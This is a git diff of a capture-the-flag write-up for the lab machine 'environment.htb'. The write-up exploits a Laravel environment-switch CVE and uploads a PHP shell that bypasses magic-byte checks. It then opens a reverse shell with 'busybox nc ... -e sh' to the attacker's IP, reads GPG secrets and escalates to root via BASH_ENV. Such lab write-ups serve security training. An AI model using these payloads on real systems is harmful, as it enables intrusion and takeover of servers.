@@ -53,7 +53,7 @@ echo "eQJKKZTGRTUtoOwXR1Sr9ysqHfNSDxt3qLLJBa6r" | base64 -d
 yJ)E5-GT+*R
 ```
 
-But nothing else in particular. To not waste time I would try to fuzz for subdomains & hidden directories on the target while looking at mailing list functionality in Burp.
+But nothing else in particular. To not waste time I would try to fuzz for subdomains & hidden directories on the target while looking at mailing list functionality in BurpSuite.
 
 To fuzz for subdomains I'll use ffuf with wordlist from seclists:
 
@@ -82,13 +82,13 @@ upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, D
 
 I found some interesting endpoints, like login, upload, storage, mailing.
 
-Using Wappalyzer extension in browser I can check that website uses PHP and Laravel.
+Trying to access `http://environment.htb/upload` or `http://environment.htb/mailing` reveals to us PHP (8.2.28) and Laravel (11.30.0) version as well as an error message that indicates we can send only POST requests to these endpoints
 
-Trying to access `http://environment.htb/upload` or `http://environment.htb/mailing` reveals to us PHP (8.2.28) and Laravel (11.30.0) version as well as an error message that indicates we can send only POST requests to these endpoints:
+That error page also reveals some internal backend codebase which means the application is running in **debug mode:**
 
 ![image](imgs/error-laravel.png)
 
-That error page also reveals some internal backend codebase which means the application is running in **debug mode**.
+Using Wappalyzer extension in browser I can confirm that website uses PHP and Laravel.
 
 ## Vulnerability Research & Exploitation
 
@@ -98,11 +98,13 @@ But for now it seems useless, since our application is already in debugging stat
 
 Also it seems like Laravel 11.30.0 is vulnerable to reflected XSS when in debug mode, [CVE-2024-13918](https://nvd.nist.gov/vuln/detail/CVE-2024-13918) but it is not useful for our case here since we don't have a victim to target.
 
-After playing with parameters on login endpoint, I was able to reveal some backend source code because application is in debug mode:
+### Login endpoint
+
+If we'll modify any params in POST request body on `http://environment.htb/login` we'll get different errors depending on parameters that we changed:
 
 ![image](imgs/login-debug.png)
 
-After removing any value from `remember` parameter in request body reveals some additional application environment, probably designed to be used by developers:
+After removing any value from `remember` parameter in request body, backend reveals some additional application environment, `preprod` designed to be used by developer:
 
 ```php
 if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
@@ -112,9 +114,13 @@ if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/p
 }
 ```
 
-Now we can connect our [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301) to change environment and access endpoint (`/management/dashboard`) of the website we should not be able to.
+### Backdoor that was left by the devs
 
-By following this [PoC](https://github.com/Nyamort/CVE-2024-52301) we can send such request to login endpoint to activate preprod environment:
+Oopsie, seems like dev himself left backdoor for us! Thats very nice of them
+
+Now we can connect our [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301) to change environment to `preprod` and access endpoint (`/management/dashboard`) of the website we should not be able to.
+
+By following this [PoC](https://github.com/Nyamort/CVE-2024-52301) we can add `?--env=preprod` as a parameter in the end of the login POST request to activate preprod environment:
 
 ```http
 POST /login?--env=preprod HTTP/1.1
@@ -135,7 +141,7 @@ Connection: keep-alive
 _token=REgoc9V6MU0xdUsJMbSBVygImoZg0AgDh0KY4X7A&email=admin%40environment.htb,attacker%40environment.htb&password=admin%27&remember=False
 ```
 
-After sending it in Burp we need to click on `Show response in browser` to be redirected to `environment.htb/management/dashboard`
+After sending request in Burp we need to click on `Show response in browser` to be redirected to `environment.htb/management/dashboard`
 
 ![image](imgs/burp-preprod.png)
 
@@ -151,10 +157,11 @@ Trying to upload a plain PHP shell won't work, because backend checks for 'magic
 
 So we need to find a way to bypass these checks and somehow upload a shell
 
-## Shell upload
+### Shell upload
 
 I will use this site with a variety of remote shells for different languages: https://www.revshells.com/
 In this case, since the site runs on PHP, I chose the following:
+
 ```
 <html>
 <body>
@@ -175,9 +182,9 @@ In this case, since the site runs on PHP, I chose the following:
 </html>
 ```
 
-Backend probably has bad regex check on filename parameter, because I could upload a file named as `index.gif.php.` with PHP cmd shell inside and magic bytes in request to bypass MIME type checking.
+Backend probably has bad regex check on filename parameter, because I could upload a file named as `index.gif.php.` with the dot in the end, PHP cmd shell inside and magic bytes in request to bypass MIME type checking.
 
-To bypass the magic bytes check, simply add the string `GIF87a` before our shell for gif file types, and also add a period at the end of the file name, which is truncated on the server side and converted to the usual `index.gif.php`.
+To bypass the magic bytes check, simply add the string `GIF87a` before our shell for gif file types, and also add a period at the end of the file name, which is truncated on the server side and gets converted to the usual `index.gif.php`.
 
 ```http
 POST /upload HTTP/1.1
@@ -241,14 +248,14 @@ Now we have RCE on the target. So to get fully functional reverse shell we need:
    rlwrap nc -lvnp 1337
    ```
 
-2. On our uploaded PHP cmd shell send any reverse shell pointing to us:
+2. On our uploaded PHP cmd shell send any reverse shell for linux system pointing to our IP:
    ```bash
    busybox nc 10.10.14.53 1337 -e sh
    ```
 
 ![image](imgs/revshell.png)
 
-3. I like to get a persistent interactive shell for reverse shell that won't drop connection after some time, so I'll use this set of commands to get one:
+3. I like to get a persistent interactive shell that won't drop connection after some time, so I'll use this set of commands after getting reverse connection on our machine:
    ```bash
    # After getting a reverse connection on netcat
    python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -357,7 +364,9 @@ gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
 
 because we don't have permission to create files as www-data user in /var/www.
 
-So we'll need to copy keyvault.gpg and hish's .gnupg directory with their private keys to directory we have write permissions to. I'll use /tmp for this:
+So we'll need to copy `keyvault.gpg` and hish's `.gnupg` directory with their private keys to directory we have write permissions to. I'll use `/tmp` for this
+
+Also, for gpg to know that it needs to use private keys from our copied directory we need to pass `--homedir /tmp/.gnupg` parameter:
 
 ```bash
 www-data@environment:$ cd /tmp
@@ -398,11 +407,13 @@ id
 uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
 ```
 
+## Root Privilege Escalation
+
 We're in! First thing I check when I get a user on a system is to see what programs I can run with sudo using `sudo -l`:
 
 ![image](imgs/hish-sudo.png)
 
-## Root Privilege Escalation
+Looing at `sudo -l` output we can see, that there's some `systeminfo` program that we can execute with root priviliges
 
 That program is actually a simple bash script:
 
@@ -428,13 +439,17 @@ echo -e "\n### Checking disk usage for all filesystems ###"
 df -h
 ```
 
-Here I lost some time, thinking where or how could we hijack execution of these commands, since they are running as root. But after checking `sudo -l` again, I see that I missed crucial `env_keep+="ENV BASH_ENV"` inside. It basically means that we can overwrite bash's internal environment variable, so when we call for `/usr/bin/systeminfo` we could pass our own variable with path to malicious script that will get a root shell when trying to execute bash binary.
+Here I lost some time, thinking where or how could we hijack execution of these commands, since they are running as root. But after checking `sudo -l` again, I see that I missed crucial `env_keep+="ENV BASH_ENV"` inside. tl;dr it means that we can overwrite bash's internal environment variable, so when we call for `/usr/bin/systeminfo` we could pass our own variable with path to malicious script that will get a root shell when trying to execute bash binary.
 
 ### BASH_ENV
 
 Searching web for BASH_ENV gives us this explanation:
+
 ```
-BASH_ENV is an environment variable in Unix-like systems that specifies the file to be executed when a non-interactive shell is started. It allows users to set up a specific environment for scripts or commands run in that shell.
+    BASH_ENV is an environment variable in Unix-like systems that 
+    specifies the file to be executed when a non-interactive shell is started. 
+    It allows users to set up a specific environment for scripts
+    or commands run in that shell.
 ```
 
 ### Exploit
@@ -459,4 +474,7 @@ root-bash-5.2# cat root.txt
 root-bash-5.2#
 ```
 
+![image](imgs/root.png)
+
+Thats it!
 We successfully got root shell on system!
